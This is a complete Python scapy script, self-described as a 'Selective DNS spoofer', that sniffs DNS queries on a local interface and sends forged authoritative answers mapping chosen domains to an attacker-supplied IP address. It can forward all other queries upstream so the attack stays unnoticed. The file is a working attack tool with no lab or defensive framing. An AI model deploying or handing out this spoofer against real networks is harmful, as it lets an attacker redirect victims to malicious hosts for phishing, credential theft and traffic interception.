#!/usr/bin/env python3
import argparse
import socket
from pathlib import Path
from scapy.all import sniff, sendp, Ether, IP, UDP, DNS, DNSRR, get_if_hwaddr, conf

def load_targets(path):
    p = Path(path)
    if not p.exists():
        return set()
    return {line.strip().lower() for line in p.read_text().splitlines() if line.strip() and not line.startswith("#")}

def forward_query(raw_query, upstream=("8.8.8.8", 53), timeout=2):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    s.sendto(raw_query, upstream)
    try:
        data, _ = s.recvfrom(4096)
    except socket.timeout:
        data = None
    s.close()
    return data

def handle_pkt(pkt, iface, attacker_ip, targets, do_forward, upstream):
    if not pkt.haslayer(DNS):
        return
    dns = pkt.getlayer(DNS)
    if dns.qr == 1:
        return
    if pkt[UDP].dport != 53:
        return
    if not dns.qd:
        return
    qname = dns.qd.qname.decode().rstrip(".").lower()
    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    src_port = pkt[UDP].sport

    if any(qname == t or qname.endswith("." + t) for t in targets):
        resp = (
            Ether(dst=pkt[Ether].src, src=get_if_hwaddr(iface))
            / IP(dst=src_ip, src=dst_ip)
            / UDP(dport=src_port, sport=53)
            / DNS(
                id=dns.id,
                qr=1,
                aa=1,
                qd=dns.qd,
                an=DNSRR(rrname=dns.qd.qname, ttl=60, rdata=attacker_ip),
            )
        )
        sendp(resp, iface=iface, verbose=False)
        print(f"[+] Spoofed {qname} -> {attacker_ip} to {src_ip}:{src_port}")
        return

    if do_forward:
        raw = bytes(pkt[UDP].payload)
        forwarded = forward_query(raw, upstream=(upstream,53))
        if forwarded:
            resp = (
                Ether(dst=pkt[Ether].src, src=get_if_hwaddr(iface))
                / IP(dst=src_ip, src=dst_ip)
                / UDP(dport=src_port, sport=53)
                / forwarded
            )
            sendp(resp, iface=iface, verbose=False)
            print(f"[+] Forwarded response for {qname} to {src_ip}")
        else:
            print(f"[-] Upstream DNS timeout for {qname}")

def main():
    parser = argparse.ArgumentParser(description="Selective DNS spoofer")
    parser.add_argument("-i", "--iface", required=True)
    parser.add_argument("-t", "--targets", required=True)
    parser.add_argument("--fake-ip", required=True)
    parser.add_argument("--forward", action="store_true")
    parser.add_argument("--upstream", default="8.8.8.8")
    args = parser.parse_args()

    iface = args.iface
    targets = load_targets(args.targets)
    fake_ip = args.fake_ip
    do_forward = args.forward
    conf.iface = iface

    print(f"[i] iface={iface} targets={targets} fake_ip={fake_ip} forward={do_forward} upstream={args.upstream}")

    sniff(iface=iface, filter="udp port 53", store=False, prn=lambda p: handle_pkt(p, iface, fake_ip, targets, do_forward, args.upstream))

if __name__ == "__main__":
    main()
